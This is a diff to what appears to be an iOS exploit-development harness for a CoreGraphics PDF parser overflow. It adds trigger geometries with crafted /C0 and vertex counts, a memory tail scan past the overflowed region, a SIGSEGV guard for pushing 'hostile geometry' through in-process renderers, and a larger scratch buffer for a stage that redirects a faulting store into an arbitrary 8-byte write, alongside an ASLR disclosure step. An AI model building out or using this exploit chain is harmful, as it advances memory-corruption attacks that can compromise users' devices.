@@ -10,7 +10,7 @@
 //
 //   CG-VT  VideoToolbox / H9 userland ASLR disclosure, plus a lazy force-load
 //          through a real HEVC encode because iOS 27 loads the encoder late.
-//   CG-1   trigger sweep: seven dict geometries, observe-only handler. Records
+//   CG-1   trigger sweep: twelve dict geometries, observe-only handler. Records
 //          si_addr, ESR WnR and the faulting instruction, then unwinds. Nothing
 //          is mapped and no store is retried, so the sweep cannot corrupt the
 //          parser's heap any further than the trigger already did.
@@ -623,7 +623,7 @@ static void cg_vt_stage(void) {
 // Stages
 // ============================================================================
 
-#define CG_NVARS 8
+#define CG_NVARS 12
 
 static const cgvar g_cg_vars[CG_NVARS] = {
     // published PoC geometry: 8-bit colour operand, five-entry /Decode
@@ -640,8 +640,17 @@ static const cgvar g_cg_vars[CG_NVARS] = {
     { "F_c16",   4, 1, 16, 8,  8, 136, 256, 256, 1 },
     // 128 rows, the shape the CFData harness uses
     { "H_r128",  4, 1, 32, 8,  8, 136, 128, 128, 1 },
-    // 32x longer array. Faults on 27.0.0, so it goes last: the sweep stops here
-    // and everything above it gets measured first.
+    // Overflow-length ladder: /C0 keeps its 1024 entries, the stream shrinks.
+    // The vertex count sets how many times the sample function is evaluated, so
+    // this separates "one call copies 1024 doubles" from "every vertex copies
+    // them again". A single vertex that still faults means the damage is inside
+    // one evaluation; small streams that survive mean the overflow accumulates.
+    { "K_v1",    4, 1, 32, 8,  8,   1,   1,1024, 1 },
+    { "K_v4",    4, 1, 32, 8,  8,   2,   2,1024, 1 },
+    { "K_v16",   4, 1, 32, 8,  8,   4,   4,1024, 1 },
+    { "K_v64",   4, 1, 32, 8,  8,   8,   8,1024, 1 },
+    // full stream, 34816 vertices. Faults on 27.0.0, so it goes last: the sweep
+    // stops here and everything above it gets measured first.
     { "G_1024",  4, 1, 32, 8,  8, 136, 256,1024, 1 },
 };
 
@@ -657,6 +666,91 @@ uint8_t *cg_pdf_build(const char *name, size_t *out_len) {
     }
     if (out_len) *out_len = 0;
     return NULL;
+}
+
+// vm_read_overwrite reports failure as a return code instead of raising SIGSEGV,
+// so a scan can touch memory that may or may not be mapped without arming the
+// fault handler again.
+static int cg_safe_read(uintptr_t addr, void *dst, size_t n) {
+    vm_size_t got = 0;
+    kern_return_t kr = vm_read_overwrite(mach_task_self(), (vm_address_t)addr,
+                                         (vm_size_t)n, (vm_address_t)dst, &got);
+    return (kr == KERN_SUCCESS && got == n) ? 0 : -1;
+}
+
+// Walk backwards from the fault address through the runaway fill. Every word
+// matching the /C0 value is a slot the render wrote; the first word that does
+// not match is the start of whatever object sits before the overwritten block.
+// owned tells us how many bytes of the neighbouring region the render owned
+// before it ran off the end.
+static void cg_tail_scan(uintptr_t far) {
+    if (!far) return;
+    uint64_t w = 0;
+    uintptr_t p = far;
+    int owned = 0;
+    while (owned < 65536) {
+        if (p < 8 || cg_safe_read(p - 8, &w, 8) != 0) break;
+        if (w != CG_REDIR_C0) break;
+        p -= 8;
+        owned++;
+    }
+    cg_logf("[CGT] tail far=0x%llx owned=%d bytes below the end",
+            (unsigned long long)far, owned * 8);
+    for (int i = 0; i < 4 && p >= 8; i++) {
+        uint64_t b = 0;
+        uintptr_t a = p - 8;
+        if (cg_safe_read(a, &b, 8) != 0) {
+            cg_logf("[CGT]   -0x%llx unreadable", (unsigned long long)(far - a));
+            break;
+        }
+        cg_logf("[CGT]   -0x%llx: %016llx", (unsigned long long)(far - a),
+                (unsigned long long)b);
+        p = a;
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Guarded call. Runs a block under a SIGSEGV/SIGBUS handler that unwinds back
+// here instead of killing the process. jb.m uses it to push hostile geometry
+// through renderers that live in this address space without taking the harness
+// down when one of them eats the store.
+// ---------------------------------------------------------------------------
+
+static sigjmp_buf cg_guard_jb;
+static volatile int cg_guard_active = 0;
+
+static void cg_guard_fault(int sig, siginfo_t *si, void *uc) {
+    (void)sig; (void)si; (void)uc;
+    if (cg_guard_active) siglongjmp(cg_guard_jb, 1);
+    _exit(139);
+}
+
+// Returns 0 when the block ran to completion, 1 when it faulted.
+int cg_guard_call(void (^blk)(void));
+
+int cg_guard_call(void (^blk)(void)) {
+    if (!blk) return -1;
+    struct sigaction sa, oldsegv, oldbus;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_sigaction = cg_guard_fault;
+    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
+    sigemptyset(&sa.sa_mask);
+    int haveBus = (sigaction(SIGBUS, &sa, &oldbus) == 0);
+    if (sigaction(SIGSEGV, &sa, &oldsegv) != 0) {
+        if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
+        return -1;
+    }
+    int fault = 0;
+    cg_guard_active = 1;
+    if (sigsetjmp(cg_guard_jb, 1) == 0) {
+        blk();
+    } else {
+        fault = 1;
+    }
+    cg_guard_active = 0;
+    sigaction(SIGSEGV, &oldsegv, NULL);
+    if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
+    return fault;
 }
 
 void cg_section(void (*logcb)(const char *)) {
@@ -720,6 +814,7 @@ void cg_section(void (*logcb)(const char *)) {
         if (cg_hit > 0) {
             win = i;
             snprintf(winName, sizeof(winName), "%s", vars[i].name);
+            cg_tail_scan(cg_far);
             // Stop the sweep on the first geometry that faults. Every further
             // render would re-enter a parser whose heap the previous one left
             // damaged, and each unwind strands more live CoreFoundation state.
@@ -801,17 +896,23 @@ void cg_section(void (*logcb)(const char *)) {
 
     // ---- CG-3: redirect ----
     {
-        uint8_t *scr = (uint8_t *)mmap(NULL, CG_PAGE_SIZE, PROT_READ | PROT_WRITE,
+        // Eight pages, not one: the retargeted store is post-indexed, so after
+        // the handler moves the base the loop keeps storing forward. A single
+        // page could not tell "seven writes then the render unwound" from
+        // "seven writes then the scratch ran out".
+        enum { CG_SCR_PAGES = 8, CG_SCR_OFF = 0x800 };
+        const size_t scrLen = (size_t)CG_SCR_PAGES * CG_PAGE_SIZE;
+        uint8_t *scr = (uint8_t *)mmap(NULL, scrLen, PROT_READ | PROT_WRITE,
                                        MAP_ANON | MAP_PRIVATE, -1, 0);
         if (scr == MAP_FAILED) {
             cg_logf("[CGR] scratch mmap failed");
         } else {
-            memset(scr, 0x5A, CG_PAGE_SIZE);
+            memset(scr, 0x5A, scrLen);
             for (int i = 0; i < 16; i++) {
                 uint64_t w = CG_CANARY;
-                memcpy(scr + 0x800 + i * 8, &w, 8);
+                memcpy(scr + CG_SCR_OFF + i * 8, &w, 8);
             }
-            uintptr_t target = (uintptr_t)(scr + 0x800 + 0x20);
+            uintptr_t target = (uintptr_t)(scr + CG_SCR_OFF + 0x20);
             cg_redir_target = target;
 
             char err[128] = {0};
@@ -844,16 +945,28 @@ void cg_section(void (*logcb)(const char *)) {
                 if (!cg_redir_decoded) {
                     cg_logf("[CGR] store instruction not decoded — no redirect");
                 } else {
+                    // Count every slot the render wrote, not just the first 16.
+                    // The span between the first and last hit is how far the
+                    // walk ran after the base register was moved.
                     int hits = 0;
+                    long first = -1, last = -1;
+                    for (size_t o = 0; o + 8 <= scrLen; o += 8) {
+                        uint64_t w;
+                        memcpy(&w, scr + o, 8);
+                        if (w != CG_REDIR_C0) continue;
+                        if (first < 0) first = (long)o;
+                        last = (long)o;
+                        hits++;
+                    }
+                    cg_logf("[CGR] marker1e15=%d span=0x%lx..0x%lx", hits,
+                            first < 0 ? 0L : first, last < 0 ? 0L : last);
                     for (int i = 0; i < 16; i++) {
                         uint64_t w;
-                        memcpy(&w, scr + 0x800 + i * 8, 8);
+                        memcpy(&w, scr + CG_SCR_OFF + i * 8, 8);
                         if (w == CG_CANARY) continue;
-                        cg_logf("[CGR] scratch+0x%x: %016llx", 0x800 + i * 8,
-                                (unsigned long long)w);
-                        if (w == CG_REDIR_C0) hits++;
+                        cg_logf("[CGR] scratch+0x%x: %016llx",
+                                CG_SCR_OFF + i * 8, (unsigned long long)w);
                     }
-                    cg_logf("[CGR] marker1e15=%d", hits);
                     if (hits > 0)
                         cg_logf("[CGR] *** ARBITRARY 8-BYTE WRITE — base register retargeted, /C0 value landed ***");
                     else
@@ -861,7 +974,7 @@ void cg_section(void (*logcb)(const char *)) {
                 }
             }
             if (pdf) free(pdf);
-            munmap(scr, CG_PAGE_SIZE);
+            munmap(scr, scrLen);
             cg_redir_target = 0;
         }
     }
